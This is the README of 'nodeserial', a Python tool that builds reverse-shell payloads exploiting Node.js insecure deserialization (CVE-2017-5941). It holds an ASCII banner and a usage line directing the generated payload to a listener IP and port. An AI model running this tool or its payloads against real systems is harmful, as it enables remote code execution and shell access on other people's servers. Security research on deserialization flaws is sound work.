# nodeserial 
## Explore Insecure Deserialization in nodejs

Per CVE-2017-5941, the vulnerability occurs when untrusted data is passed to a serialize() function, resulting in remote code execution passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).

This tool was made to automate this process, generating a payload for reverse shell, have fun exploring nodejs deserialization in vulnerable applications.

```
                 _                     _       _ 
                | |                   (_)     | |
 _ __   ___   __| | ___  ___  ___ _ __ _  __ _| |
| '_ \ / _ \ / _` |/ _ \/ __|/ _ \ '__| |/ _` | |
| | | | (_) | (_| |  __/\__ \  __/ |  | | (_| | |
|_| |_|\___/ \__,_|\___||___/\___|_|  |_|\__,_|_|
```
`Usage: python3 nodeserial.py -l 10.9.8.16 -p 443 --params username -e b64`